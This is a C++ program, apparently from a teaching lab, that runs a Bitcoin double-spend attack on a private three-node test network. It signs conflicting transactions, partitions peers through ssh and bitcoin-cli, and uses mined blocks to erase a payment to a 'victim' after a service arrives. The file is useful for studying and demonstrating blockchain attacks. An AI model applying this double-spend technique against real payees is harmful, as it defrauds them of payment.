#include <cstdlib>
#include <cstdio>

#include "CParameterPreparator.h"
#include "CSynchronizationGuard.h"
#include "CTransactionHandler.h"

/**
 * Function to save generated attacker address into a file.
 */
void saveGeneratedAttackerAddress(const std::string &attackerAddress) {
    //The attackers' address is suppossed to receive ((the full ammount of bitcoins in selected UTXO) - fee) in case of successfull attack. -> We want to save it into our filesystem, so it can be further used.
    std::filesystem::directory_iterator addressIt("/home/attacker/attacker/addresses");
    int addressCount = std::count_if(begin(addressIt), end(addressIt),
                                     [](const auto &entry) { return entry.is_regular_file(); });
    std::ostringstream fileName;
    fileName << "/home/attacker/attacker/addresses/address_" << addressCount << ".txt";
    std::ofstream addressFile(fileName.str());
    addressFile << attackerAddress;
}

/**
 * Function to mine a specified ammount of blocks with a specified "function".
 */
void mine(const std::string function, const int minedBlockCnt) {
    for (int i = 0; i < minedBlockCnt; ++i) {
        redi::ipstream mine(function, redi::pstream::pstdout);
    }
}

int main() {
    //Perform a synchronization check.
    if (system("~/attacks/scripts/checkSynchronization.sh")) {
        std::cerr << rang::fg::red << rang::style::bold << "------------------NETWORK ERROR------------------"
                  << std::endl
                  << "One or more of the expected nodes is not running/synchronized. Please try waiting for a short while and rerunning the program. If the problem persists, consider reseting the network. "
                  << rang::style::reset << std::endl;
        return 1;
    }

    //Check whether a usable address exists within the system. If not, generate one.
    if (std::filesystem::is_empty("/home/attacker/attacker/addresses")) {
        std::cout << rang::fg::gray << rang::style::bold << "No usable addresses exist, generating new address."
                  << rang::style::reset << std::endl;
        system("bitcoin-cli getnewaddress > ~/attacker/addresses/address_0.txt");
    }

    //Create helper objects.
    CSynchronizationGuard synchronizationGuard;
    CParameterPreparator parameterPreparator;
    CTransactionHandler transactionHandler;

    //Select the UTXO to be used in the attack.
    transactionInfo UTXO = parameterPreparator.chooseUTXO();

    //Generate addresses (except for the one with the UTXO, that is pre-defined) in format <victimAddress, attackerAddress2>.
    std::pair<std::string, std::string> addresses = parameterPreparator.generateAddresses(
            "ssh victim1@$IP_VICTIM1 'bitcoin-cli getnewaddress'", "bitcoin-cli getnewaddress");
    saveGeneratedAttackerAddress(addresses.second);

    //Calculate ammounts "paid" to the victim node.
    std::pair<float, float> paidAmmounts = parameterPreparator.calculateAmmounts(UTXO, 1.1);

    //Create transactions using the same UTXOs, but to different addresses.
    std::ostringstream txVictimOss, txAttackerOss;
    //Standard transaction to the victim.
    txVictimOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                << "}]\' \'{\"" << addresses.first << "\":" << paidAmmounts.first << ", \"" << UTXO.m_address << "\":"
                << paidAmmounts.second - 1;
    //Transaction simply sends [UTXO.amount-fee] to attackers other address.
    //Fee on the second transaction has to be higher due to RBF policy: https://buybitcoinworldwide.com/rbf/
    txAttackerOss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
                  << "}]\' \'{\"" << addresses.second << "\":" << paidAmmounts.first + paidAmmounts.second;

    //Generate and sign both transactions. Keep signed hexes as structure <victimTx, attackerTx>.
    std::pair<std::string, std::string> signedTransactionHexes = transactionHandler.createSignedTransactions(
            txVictimOss, txAttackerOss);

    //Disconnect from VICTIM1.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM1:18445");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM1:18445\"");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM2:18445\"");
    synchronizationGuard.waitForDisconnection(1, 0, 1);

    //Send the attacker transaction [the one supposed to persist] to the VICTIM2 and save the txid of the created transaction.
    std::string txidAttackerSent = transactionHandler.sendTransaction(signedTransactionHexes.second);
    synchronizationGuard.waitForRawTxDelivery("ssh victim2@$IP_VICTIM2 'bitcoin-cli getrawmempool'", txidAttackerSent);
    std::cout << rang::style::bold << rang::fg::gray << "The transaction to attackers' second account with txid ["
              << txidAttackerSent << "] has been sent to VICTIM2 (representing the rest of the network)."
              << rang::style::reset << std::endl;

    //Disconnect ATTACKER and VICTIM2. -> All nodes should be disconnected.
    system("bitcoin-cli addnode $IP_VICTIM2:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM2:18445");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    synchronizationGuard.waitForDisconnection(0, 0, 0);

    //Delete the transaction to the VICTIM2 from attackers' mempool.
    transactionHandler.deleteTransaction(txidAttackerSent);

    //Conect attacker back to VICTIM1.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 add");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    synchronizationGuard.waitForConnection("bitcoin-cli getaddednodeinfo",
                                           "ssh victim1@$IP_VICTIM1 \"bitcoin-cli getaddednodeinfo\"");

    //Send the VICTIM1 transaction for them and save the txid of the created transaction.
    std::string txidVictimSent = transactionHandler.sendTransaction(signedTransactionHexes.first);
    synchronizationGuard.waitForTxDelivery("ssh victim1@$IP_VICTIM1 'bitcoin-cli listtransactions'", txidVictimSent);
    std::cout << rang::style::bold << rang::fg::gray << "The transaction to VICTIM1 with txid [" << txidVictimSent
              << "] has been sent." << rang::style::reset << std::endl;

    //Mine the required number of blocks as an attacker.
    int preminedBlockCnt;
    std::cout << rang::style::bold << rang::fg::gray << "Enter the number of blocks to pre-mine as an attacker: "
              << rang::style::reset;
    std::cin >> preminedBlockCnt;
    std::cout << rang::style::bold << rang::fg::gray << "Attacker is pre-mining [" << preminedBlockCnt
              << "] blocks and sending them to VICTIM1." << rang::style::reset << std::endl;
    mine("bitcoin-cli -generate 1", preminedBlockCnt);

    //Delete any previously received services.
    redi::ipstream del("rm -r /home/attacker/attacker/victim1/serviceVictim1.txt",
                       redi::pstreams::pstdout | redi::pstreams::pstderr);

    //Issue calls to victim to run their returnService.sh script simmulating a deamon running on them that sends some kind of service for received payments.
    system("ssh victim1@$IP_VICTIM1 \"./scripts/returnService.sh\"");

    //Simulate the network mining faster than attacker.
    std::cout << rang::style::bold << rang::fg::gray << "VICTIM2 (representing the rest of the network) is pre-mining ["
              << preminedBlockCnt + 1 << "] blocks and sending them to VICTIM1." << rang::style::reset << std::endl;
    mine("ssh victim2@$IP_VICTIM2 'bitcoin-cli -generate 1'", preminedBlockCnt + 1);

    //Connect back to the VICTIM2.
    system("bitcoin-cli addnode $IP_VICTIM2:18445 add");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 add\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 add\"");

    //Wait for all nodes to connect back.
    while (system("~/attacks/scripts/checkSynchronization.sh")) {
        sleep(DELAY_SEC);
    }

    //Print the transaction to show success of the attack.
    std::cout << rang::style::bold << rang::fg::gray << "Transaction issued to victim ([" << txidVictimSent
              << "]) should no longer exist, while the transaction issued to attackers' second account (["
              << txidAttackerSent << "]) should still exist:" << rang::style::reset << std::endl;
    transactionHandler.printTransactions("----------------------ATTACKER----------------------",
                                         "-----------------------VICTIM------------------------",
                                         "bitcoin-cli listtransactions \"*\" 200",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         txidAttackerSent, txidVictimSent);

    //Report attack success/failure.
    if (std::filesystem::exists("/home/attacker/attacker/victim1/serviceVictim1.txt")) {
        std::cout << rang::fg::green << rang::style::bold << "Attack was successful, service was correctly received:"
                  << rang::style::reset << std::endl;
        std::cout << rang::style::bold << rang::fg::magenta << "-----------------------VICTIM------------------------"
                  << rang::style::reset << std::endl;
        system("cat ~/attacker/victim1/serviceVictim1.txt");
        std::cout << rang::style::bold << rang::fg::gray << "-----------------------------------------------------"
                  << rang::style::reset << std::endl;
        std::cout << rang::fg::green << rang::style::bold
                  << "The received service is the file: '~/attacker/victim1/serviceVictim1.txt'" << rang::style::reset
                  << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold << "Attack unssuccessful, the service was not received!"
                  << std::endl << "You can check '~/attacker/victim1/serviceVictim1.txt' to debug what happend."
                  << std::endl << "If this was not the expected output, consider reseting the network."
                  << rang::style::reset << std::endl;
    }

    return 0;
}
